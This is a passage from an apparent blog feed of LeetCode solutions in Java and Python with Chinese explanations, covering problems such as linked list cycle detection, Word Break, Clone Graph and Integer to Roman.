<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *  Use the method of HashSet</span></span><br><span class="line"><span class="comment"> *  To detect if a list is cyclic,</span></span><br><span class="line"><span class="comment"> *  we can check whether a node had been visited before.</span></span><br><span class="line"><span class="comment"> *   A natural way is to use a hash table.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">hasCycle</span><span class="params">(ListNode head)</span> </span>&#123;</span><br><span class="line">    HashSet&lt;ListNode&gt; set = <span class="keyword">new</span> HashSet&lt;&gt;();</span><br><span class="line">    <span class="keyword">while</span> (head != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (set.contains(head)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        set.add(head);</span><br><span class="line">        head = head.next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>两个指针的方案，想象一下两个运动员在跑道上以不同的速度跑步。如果跑道是个圆，那么将会发生什么？考虑两个不同速度移动的指针 - 慢指针和快指针。如果在链表中没有环，快指针将会跑到终点，我们可以返回false。如果链表中包含环，那么快指针和慢指针最终将相遇。</p>
<ul>
<li>注意要让fast跑在slow前面，这样才能跑完完整一圈</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">hasCycle</span><span class="params">(ListNode head)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (head == <span class="keyword">null</span> || head.next == <span class="keyword">null</span>) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    ListNode slow = head;   <span class="comment">// 慢指针在后</span></span><br><span class="line">    ListNode fast = head.next;  <span class="comment">// 快指针在前</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (fast != slow) &#123;  <span class="comment">// 判断是否相遇</span></span><br><span class="line">        <span class="comment">// 快指针跑完了，返回false</span></span><br><span class="line">        <span class="keyword">if</span> ((fast == <span class="keyword">null</span>) || (fast.next == <span class="keyword">null</span>)) <span class="keyword">return</span> <span class="keyword">false</span>; </span><br><span class="line">        slow = slow.next;</span><br><span class="line">        fast = fast.next.next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>也可以让慢指针和快指针同时从起点开始，但是while循环判断的条件要改变，因为一开始fast = slow.</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">hasCycle</span><span class="params">(ListNode head)</span> </span>&#123;</span><br><span class="line">    ListNode slow = head;</span><br><span class="line">    ListNode fast = head;</span><br><span class="line">    <span class="keyword">while</span> (fast != <span class="keyword">null</span> &amp;&amp; fast.next != <span class="keyword">null</span>) &#123;</span><br><span class="line">        slow = slow.next;</span><br><span class="line">        fast = fast.next.next;</span><br><span class="line">        <span class="keyword">if</span> (fast == slow) <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Leetcode </tag>
            
            <tag> Linked List </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[139. Word Break]]></title>
      <url>/wiki/2017/10/30/Leetcode-139-Word-Break/</url>
      <content type="html"><![CDATA[<p>Given a <strong>non-empty</strong> string s and a dictionary <em>wordDict</em> containing a list of <strong>non-empty</strong> words, determine if $s$ can be segmented into a space-separated sequence of one or more dictionary words.</p>
<p><strong>Note</strong>:</p>
<ul>
<li>The same word in the dictionary may be reused multiple times in the segmentation.</li>
<li>You may assume the dictionary does not contain duplicate words.</li>
</ul>
<p>Example 1:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Input: s = &quot;leetcode&quot;, wordDict = [&quot;leet&quot;, &quot;code&quot;]</span><br><span class="line">Output: true</span><br><span class="line">Explanation: Return true because &quot;leetcode&quot; can be segmented as &quot;leet code&quot;.</span><br></pre></td></tr></table></figure>
<p>Example 2:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Input: s = &quot;applepenapple&quot;, wordDict = [&quot;apple&quot;, &quot;pen&quot;]</span><br><span class="line">Output: true</span><br><span class="line">Explanation: Return true because &quot;applepenapple&quot; can be segmented as &quot;apple pen apple&quot;.</span><br><span class="line">             Note that you are allowed to reuse a dictionary word.</span><br></pre></td></tr></table></figure>
<p>Example 3:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: s = &quot;catsandog&quot;, wordDict = [&quot;cats&quot;, &quot;dog&quot;, &quot;sand&quot;, &quot;and&quot;, &quot;cat&quot;]</span><br><span class="line">Output: false</span><br></pre></td></tr></table></figure>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">wordBreak</span><span class="params">(String s, List&lt;String&gt; wordDict)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">boolean</span>[] f = <span class="keyword">new</span> <span class="keyword">boolean</span>[s.length() + <span class="number">1</span>];</span><br><span class="line">    f[<span class="number">0</span>] = <span class="keyword">true</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= s.length(); i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; i; j++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(f[j] &amp;&amp; wordDict.contains(s.substring(j, i)))&#123;</span><br><span class="line">                f[i] = <span class="keyword">true</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> f[s.length()];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Dynamic Programming </tag>
            
            <tag> Leetcode </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[429. N-ary Tree Level Order Traversal]]></title>
      <url>/wiki/2017/10/30/Leetcode-429-N-ary-Tree-Level-Order-Traversal/</url>
      <content type="html"><![CDATA[<p>Given an n-ary tree, return the level order traversal of its nodes’ values. (ie, from left to right, level by level).</p>
<p>For example, given a <code>3-ary</code> tree:</p>
<p><img src="http://or9a8nskt.bkt.clouddn.com/LeetCode429.png" alt="LeetCode429"></p>
<p>We should return its level order traversal:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[</span><br><span class="line">     [1],</span><br><span class="line">     [3,2,4],</span><br><span class="line">     [5,6]</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
<p>Note:</p>
<ul>
<li>The depth of the tree is at most <code>1000</code>.</li>
<li>The total number of nodes is at most <code>5000</code>.</li>
</ul>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><p>这道题目是102. Binary Tree Level Order Traversal的扩展，将一棵树的子节点的数目从2增加到了任意。其实只要在遍历的时候，依次遍历子节点就行了。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> List&lt;List&lt;Integer&gt;&gt; levelOrder(Node root) &#123;</span><br><span class="line">    List&lt;List&lt;Integer&gt;&gt; res = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">    <span class="keyword">if</span> (root == <span class="keyword">null</span>) <span class="keyword">return</span> res;</span><br><span class="line">    Queue&lt;Node&gt; queue = <span class="keyword">new</span> LinkedList&lt;&gt;();</span><br><span class="line">    queue.offer(root);</span><br><span class="line">    <span class="keyword">while</span> (!queue.isEmpty()) &#123;</span><br><span class="line">        <span class="keyword">int</span> size = queue.size();</span><br><span class="line">        List&lt;Integer&gt; list = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; size; i++) &#123;</span><br><span class="line">            Node node = queue.poll();</span><br><span class="line">            list.add(node.val);</span><br><span class="line">            <span class="keyword">for</span> (Node child: node.children)</span><br><span class="line">                <span class="keyword">if</span> (child != <span class="keyword">null</span>) queue.offer(child);</span><br><span class="line">        &#125;</span><br><span class="line">        res.add(list);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Leetcode </tag>
            
            <tag> Tree </tag>
            
            <tag> Breath-first Search </tag>
            
            <tag> Stack </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[415. Add Strings]]></title>
      <url>/wiki/2017/10/30/Leetcode-415-Add-Strings/</url>
      <content type="html"><![CDATA[<p>Given two non-negative integers <code>num1</code> and <code>num2</code> represented as string, return the sum of <code>num1</code> and <code>num2</code>.</p>
<p><strong>Note</strong>:</p>
<ul>
<li>The length of both <code>num1</code> and <code>num2</code> is &lt; 5100.</li>
<li>Both <code>num1</code> and <code>num2</code> contains only digits 0-9.</li>
<li>Both <code>num1</code> and <code>num2</code> does not contain any leading zero.</li>
<li>You must not use any built-in BigInteger library or convert the inputs to integer directly.</li>
</ul>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><p>考查数字和字符串的基本操作。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">addStrings</span><span class="params">(String num1, String num2)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (num1 == <span class="keyword">null</span> || num2 == <span class="keyword">null</span>) <span class="keyword">return</span> <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">int</span> n1 = num1.length(), n2 = num2.length();</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>, carry = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> d1, d2, digit;</span><br><span class="line">    StringBuilder s = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">    <span class="keyword">while</span> (i &lt; n1 || i &lt; n2 || carry &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        d1 = <span class="number">0</span>; d2 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (i &lt; n1) d1 = num1.charAt(n1 - <span class="number">1</span> - i) - <span class="string">'0'</span>;</span><br><span class="line">        <span class="keyword">if</span> (i &lt; n2) d2 = num2.charAt(n2 - <span class="number">1</span> - i) - <span class="string">'0'</span>;</span><br><span class="line">        digit = d1 + d2 + carry;</span><br><span class="line">        <span class="keyword">if</span> (digit &gt; <span class="number">9</span>) &#123;carry = <span class="number">1</span>; digit -= <span class="number">10</span>;&#125;</span><br><span class="line">        <span class="keyword">else</span> carry = <span class="number">0</span>;</span><br><span class="line">        </span><br><span class="line">        s.append(digit);</span><br><span class="line">        i++;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> s.reverse().toString();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Leetcode </tag>
            
            <tag> Math </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[10. Regular Expression Matching]]></title>
      <url>/wiki/2017/10/30/Leetcode-10-Regular-Expression-Matching/</url>
      <content type="html"><![CDATA[<p>Implement regular expression matching with support for <code>.</code> and <code>*</code>.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&apos;.&apos; Matches any single character.</span><br><span class="line">&apos;*&apos; Matches zero or more of the preceding element.</span><br><span class="line"></span><br><span class="line">The matching should cover the entire input string (not partial).</span><br><span class="line"></span><br><span class="line">The function prototype should be:</span><br><span class="line">bool isMatch(const char *s, const char *p)</span><br><span class="line"></span><br><span class="line">Some examples:</span><br><span class="line">isMatch(&quot;aa&quot;,&quot;a&quot;) → false</span><br><span class="line">isMatch(&quot;aa&quot;,&quot;aa&quot;) → true</span><br><span class="line">isMatch(&quot;aaa&quot;,&quot;aa&quot;) → false</span><br><span class="line">isMatch(&quot;aa&quot;, &quot;a*&quot;) → true</span><br><span class="line">isMatch(&quot;aa&quot;, &quot;.*&quot;) → true</span><br><span class="line">isMatch(&quot;ab&quot;, &quot;.*&quot;) → true</span><br><span class="line">isMatch(&quot;aab&quot;, &quot;c*a*b&quot;) → true</span><br></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Leetcode </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[133. Clone Graph]]></title>
      <url>/wiki/2017/10/30/Leetcode-133-Clone-Graph/</url>
      <content type="html"><![CDATA[<p>Given the head of a graph, return a deep copy (clone) of the graph. Each node in the graph contains a <code>label</code> (<code>int</code>) and a list (<code>List[UndirectedGraphNode]</code>) of its neighbors. There is an edge between the given node and each of the nodes in its neighbors.</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">UndirectedGraphNode</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> label;</span><br><span class="line">    List&lt;UndirectedGraphNode&gt; neighbors;</span><br><span class="line"></span><br><span class="line">    UndirectedGraphNode(<span class="keyword">int</span> x) &#123;</span><br><span class="line">        label = x;</span><br><span class="line">        neighbors = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><p>DFS，需要注意的是要把克隆的节点放入哈希表中，如果某一节点已经克隆，则直接返回该节点。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> UndirectedGraphNode <span class="title">cloneGraph</span><span class="params">(UndirectedGraphNode node)</span> </span>&#123;</span><br><span class="line">        HashMap&lt;Integer, UndirectedGraphNode&gt; map = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">        <span class="keyword">return</span> clone(node, map);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> UndirectedGraphNode <span class="title">clone</span><span class="params">(UndirectedGraphNode node, </span></span></span><br><span class="line"><span class="function"><span class="params">                  HashMap&lt;Integer, UndirectedGraphNode&gt; map)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (node == <span class="keyword">null</span>) <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">if</span> (map.containsKey(node.label))  <span class="keyword">return</span> map.get(node.label);</span><br><span class="line">        UndirectedGraphNode clone = <span class="keyword">new</span> UndirectedGraphNode(node.label);</span><br><span class="line">        map.put(clone.label, clone);</span><br><span class="line">        <span class="keyword">for</span> (UndirectedGraphNode neighbor : node.neighbors)</span><br><span class="line">            clone.neighbors.add(clone(neighbor, map));</span><br><span class="line">        <span class="keyword">return</span> clone;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Leetcode </tag>
            
            <tag> Depth-first Search </tag>
            
            <tag> Breath-first Search </tag>
            
            <tag> Graph </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[11. Container With Most Water]]></title>
      <url>/wiki/2017/10/30/Leetcode-11-Container-With-Most-Water/</url>
      <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>Given $n$ non-negative integers $a_1, a_2, …, a_n$, where each represents a point at coordinate $(i, a_i)$. $n$ vertical lines are drawn such that the two endpoints of line $i$ is at $(i, a_i)$ and $(i, 0)$. Find two lines, which together with x-axis forms a container, such that the container contains the most water.</p>
<p>Note: You may not slant the container and $n$ is at least 2.</p>
<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>贪心算法：容器面积，取决于最短的木板</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">maxArea</span><span class="params">(self, height)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type height: List[int]</span></span><br><span class="line"><span class="string">        :rtype: int</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        left, right = <span class="number">0</span>, len(height)<span class="number">-1</span></span><br><span class="line">        max_area = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> left &lt; right:</span><br><span class="line">            <span class="keyword">if</span> min(height[left], height[right])*(right-left) &gt; max_area:</span><br><span class="line">                max_area = min(height[left], height[right])*(right-left)</span><br><span class="line">            <span class="keyword">if</span> height[left] &lt; height[right]:</span><br><span class="line">                left += <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                right -= <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> max_area</span><br></pre></td></tr></table></figure>
<p>相关题目：</p>
<ul>
<li>Trapping Rain Water</li>
<li>Largest Rectangle in Histogram,</li>
</ul>
<p><a href="https://www.youtube.com/watch?v=pdKz9TvIjS8">参考视频</a></p>
]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Leetcode </tag>
            
            <tag> Two Points </tag>
            
            <tag> Greedy Algorithm </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[12. Integer to Roman]]></title>
      <url>/wiki/2017/10/30/Leetcode-12-Integer-to-Roman/</url>
      <content type="html"><![CDATA[<p>Given an integer, convert it to a roman numeral.</p>
<p>Input is guaranteed to be within the range from 1 to 3999.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">intToRoman</span><span class="params">(self, num)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type num: int</span></span><br><span class="line"><span class="string">        :rtype: str</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        values = [ <span class="number">1000</span>, <span class="number">900</span>, <span class="number">500</span>, <span class="number">400</span>, <span class="number">100</span>, <span class="number">90</span>, <span class="number">50</span>, <span class="number">40</span>, <span class="number">10</span>, <span class="number">9</span>, <span class="number">5</span>, <span class="number">4</span>, <span class="number">1</span> ]</span><br><span class="line">        numerals = [ <span class="string">"M"</span>, <span class="string">"CM"</span>, <span class="string">"D"</span>, <span class="string">"CD"</span>, <span class="string">"C"</span>, <span class="string">"XC"</span>, <span class="string">"L"</span>, <span class="string">"XL"</span>, <span class="string">"X"</span>, <span class="string">"IX"</span>, <span class="string">"V"</span>, <span class="string">"IV"</span>, <span class="string">"I"</span> ]</span><br><span class="line">        ret = <span class="string">''</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(values)):</span><br><span class="line">            <span class="keyword">while</span> num &gt;= values[i]:</span><br><span class="line">                num -= values[i]</span><br><span class="line">                ret += numerals[i]</span><br><span class="line">        <span class="keyword">return</span> ret</span><br></pre></td></tr></table></figure>
<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>罗马数字的计数方法:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">罗马字符    I   V   X   L   C   D   M</span><br><span class="line">整数数字    1   5   10  50  100 500 1000</span><br></pre></td></tr></table></figure>
<p>计数规则：</p>
<ul>
<li>相同的数字连写，所表示的数等于这些数字相加得到的数，例如：III = 3</li>
<li>小的数字在大的数字右边，所表示的数等于这些数字相加得到的数，例如：VIII = 8</li>
<li>小的数字，限于（I、X和C）在大的数字左边，所表示的数等于大数减去小数所得的数，例如：IV = 4</li>
<li>正常使用时，连续的数字重复不得超过三次</li>
<li>在一个数的上面画横线，表示这个数扩大1000倍（本题只考虑3999以内的数，所以用不到这条规则）</li>
</ul>
<p>罗马数字可以分为1、4、5、9这四种构成方式，而1-3999中，共有1000, 900, 500, 400, 100, 90, 50, 40, 10, 9, 5, 4, 1，共计13种，依次分别对应”M”, “CM”, “D”, “CD”, “C”, “XC”, “L”, “XL”, “X”, “IX”, “V”, “IV”, “I”，即：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">整数数字  1000 900 500 400 100 90 50 40 10 9  5 4  1</span><br><span class="line">罗马数字  M    CM  D   CD  C   XC L  XL X  IX V IV I</span><br></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Leetcode </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[14. Longest Common Prefix]]></title>
      <url>/wiki/2017/10/30/Leetcode-14-Longest-Common-Prefix/</url>
      <content type="html"><![CDATA[<p>Write a function to find the longest common prefix string amongst an array of strings.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">longestCommonPrefix</span><span class="params">(self, strs)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type strs: List[str]</span></span><br><span class="line"><span class="string">        :rtype: str</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="comment"># 空的列表</span></span><br><span class="line">        <span class="keyword">if</span> strs == []:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">""</span></span><br><span class="line">        </span><br><span class="line">        lcp = <span class="string">""</span></span><br><span class="line">        small_length = len(strs[<span class="number">0</span>])</span><br><span class="line">        <span class="keyword">for</span> str <span class="keyword">in</span> strs:</span><br><span class="line">            <span class="keyword">if</span> len(str) &lt; small_length:</span><br><span class="line">                small_length = len(str)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 全部都是空字符串</span></span><br><span class="line">        <span class="keyword">if</span> small_length == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">""</span></span><br><span class="line">        </span><br><span class="line">        print(small_length)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(small_length):</span><br><span class="line">            lcp += strs[<span class="number">0</span>][i]</span><br><span class="line">            <span class="keyword">for</span> str <span class="keyword">in</span> strs:</span><br><span class="line">                <span class="comment"># 该字符不符合最大子字符串</span></span><br><span class="line">                <span class="keyword">if</span> str[i] != lcp[i]:</span><br><span class="line">                    <span class="keyword">return</span> lcp[<span class="number">0</span>:i]</span><br><span class="line">        <span class="comment">#全部符合</span></span><br><span class="line">        <span class="keyword">return</span> lcp</span><br></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Leetcode </tag>
            
            <tag> greedy algorithm </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[129. Sum Root to Leaf Numbers]]></title>
      <url>/wiki/2017/10/30/Leetcode-129-Sum-Root-to-Leaf-Numbers/</url>
      <content type="html"><![CDATA[<p>Given a binary tree containing digits from 0-9 only, each root-to-leaf path could represent a number.</p>
<p>An example is the root-to-leaf path 1-&gt;2-&gt;3 which represents the number 123.</p>
<p>Find the total sum of all root-to-leaf numbers.</p>
<p>Note: A leaf is a node with no children.</p>
<p>Example:</p>
